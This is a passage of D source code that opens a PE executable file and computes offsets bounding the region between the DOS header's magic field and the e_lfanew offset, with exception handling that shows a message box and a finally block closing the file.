    if(pe.OpenPeFile(pInputFile) == 0)
    {
      pStartAddress = cast(uint) &pe.Dos.e_lfanew - cast(uint) &pe.Dos.e_magic + 4;
      pStopAddress = pe.Dos.e_lfanew;	
    } else 
      lRetVal = 1;
  } catch (Exception e) {
    msgBox("Exception occurred while opening \"" ~ pInputFile ~ "\" : " ~ e.toString);
  }

  finally 
  {
    pe.Close();
  }


  return(lRetVal);
}